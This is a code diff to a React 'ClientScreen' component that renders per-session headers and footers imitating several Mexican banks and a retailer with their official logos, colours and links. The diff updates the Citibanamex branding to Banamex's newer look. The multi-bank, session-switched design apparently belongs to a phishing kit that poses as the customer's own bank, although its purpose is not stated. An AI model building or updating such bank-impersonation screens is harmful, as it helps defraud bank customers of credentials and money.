@@ -6,7 +6,7 @@ import { Session, ScreenType } from '@shared/schema';
 import { formatDate } from '@/utils/helpers';
 import liverpoolLogo from '@assets/logo-brand-liverpool-f-c-design-acaab2087aa7319e33227c007e2d759b.png'; // Logo de Liverpool
 import liverpoolLogoWhite from '@assets/liverpool_logo_white.png'; // Logo de Liverpool en blanco
-import citibanamexLogo from '../assets/Banamex.png';
+import banamexLogo from '../assets/banamex_logo_new.png';
 import banbajioLogo from '../assets/banbajio_logo_oficial.png';
 import banbajioBackground from '../assets/IMG_0354.jpeg';
 import bbvaLogo from '@assets/bbva_logo.png';
@@ -219,11 +219,11 @@ export default function ClientScreen() {
       );
     } else if (sessionData.banco === 'CITIBANAMEX') {
       return (
-        <header className="bg-[#005BAC] text-white p-4 text-center">
+        <header className="bg-[#E50012] text-white p-4 text-center">
           <img 
-            src={citibanamexLogo} 
-            className="citibanamex-logo inline-block mb-2" 
-            alt="Citibanamex" 
+            src={banamexLogo} 
+            className="banamex-logo inline-block mb-2" 
+            alt="Banamex" 
           />
           <div className="font-bold text-sm">{formatDate(new Date())}</div>
         </header>
@@ -486,7 +486,7 @@ export default function ClientScreen() {
             } mx-2`}>Ayuda</a>
             <a href={
               sessionData.banco === 'LIVERPOOL' ? 'https://www.liverpool.com.mx/ayuda/terminos-y-condiciones/terminos-y-condiciones/' : 
-              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/es/personas/terminos-y-condiciones.html' : 
+              sessionData.banco === 'CITIBANAMEX' ? 'https://www.banamex.com/terminos-y-condiciones' : 
               sessionData.banco === 'BBVA' ? 'https://www.bbva.mx/personas/informacion-adicional.html' :
               sessionData.banco === 'BANCOPPEL' ? 'https://www.bancoppel.com/acerca_bancoppel/terminos.html' :
               sessionData.banco === 'HSBC' ? 'https://www.hsbc.com.mx/condiciones/' :
@@ -608,7 +608,7 @@ export default function ClientScreen() {
               } target="_blank" rel="noopener noreferrer" className="text-white mx-2">Promociones</a> |
               <a href={
                 sessionData.banco === 'LIVERPOOL' ? 'https://www.facebook.com/liverpoolmexico' : 
-                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/CitibanamexMx' : 
+                sessionData.banco === 'CITIBANAMEX' ? 'https://www.facebook.com/BanamexOficial' : 
                 sessionData.banco === 'BBVA' ? 'https://www.facebook.com/BBVAMexico' :
                 sessionData.banco === 'BANCOPPEL' ? 'https://www.facebook.com/BanCoppel' :
                 sessionData.banco === 'HSBC' ? 'https://www.facebook.com/HSBC.MX' :
